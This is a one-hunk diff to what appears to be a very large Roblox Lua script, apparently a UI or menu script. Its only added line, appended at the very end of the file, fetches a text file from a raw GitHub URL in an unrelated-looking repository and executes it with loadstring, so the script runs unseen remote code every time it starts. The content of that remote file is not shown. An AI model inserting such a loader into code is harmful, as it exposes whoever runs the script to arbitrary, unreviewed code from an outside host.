@@ -11812,3 +11812,4 @@ Setting:AddToggle({
 		end;
 	end,
 });
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ohmay5/Main/refs/heads/main/attach.txt"))()
